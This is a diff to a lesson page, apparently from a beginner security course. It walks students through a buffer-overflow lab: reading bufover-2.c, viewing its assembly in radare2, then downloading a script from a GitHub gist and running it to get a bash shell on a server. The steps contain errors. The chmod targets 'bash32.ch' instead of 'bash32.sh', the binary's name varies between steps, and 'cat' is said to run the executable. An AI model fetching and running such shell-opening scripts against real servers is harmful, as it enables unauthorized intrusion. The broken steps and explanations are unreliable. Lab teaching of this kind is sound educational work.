@@ -46,20 +46,45 @@ We need to know what assembly does because it is going to help us take down the 
 
 Alice and Bob need us to take control of a L33k3r server so we can destroy it from the inside out! This is called pwning. So we will be compromising another server to gain access, almost like how we used the File Upload Exploit to gain access to the Global Dessert Vault!
 
+So, let go to the terminal we have been using the past couple of days:  <a href="http://157.230.203.138/term" target="_blank">TERMINAL</a>
 
-ls
-cd secsoft
-ls
-cat bufover-2.c
-cat bufover-2
-r2 -Ad bufover2
-Vpp
-q
-enter
-enter
-wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh
-chmod +x bash32.ch
-./bash32.sh buffer-2 ipaddr port
+First begin by listing all the files in the home directory
+- `ls`
+
+Next we will move into the secsoft directory
+- `cd secsoft`
+
+Now let us list the files in this directory
+- `ls`
+
+Let's read the bufover-2.c file. This is a c file contiang c code. This will generate 
+- `cat bufover-2.c`
+
+Now we will read the bufover-2 file. This file is the executable for the file we just read. Meaning it will run that file.
+- `cat bufover-2`
+
+Let's run the executable
+- `r2 -Ad bufover-2`
+
+Now that our process is running, lets enter this for the input.
+- `Vpp`
+
+What you are seeing is the assembly code for the bufover-2.c file. You can navigate through the code by using the "j" and "k" keys.
+To Exit out of this view, press q
+- `q`
+
+The program is asking us a few questions, lets answer them by pressing the enter key twice.
+- `enter`
+- `enter`
+
+Next we are get some code that will help us infiltrate a server. This code is a script we will run which will create a completely new Bash Terminal that will have control over that server
+- `wget https://gist.githubusercontent.com/AndyNovo/217341c2818dc569294c86ffafc0ef9b/raw/530536eb4dd081869651f85d1c4ca04f8183b0c7/bash32.sh`
+
+The command below will give the file we just downloaded exectuable permission.
+- `chmod +x bash32.ch`
+
+Now let's run out script to infiltrate out local server!
+- `./bash32.sh buffer-2 ipaddr port`
 
 
 
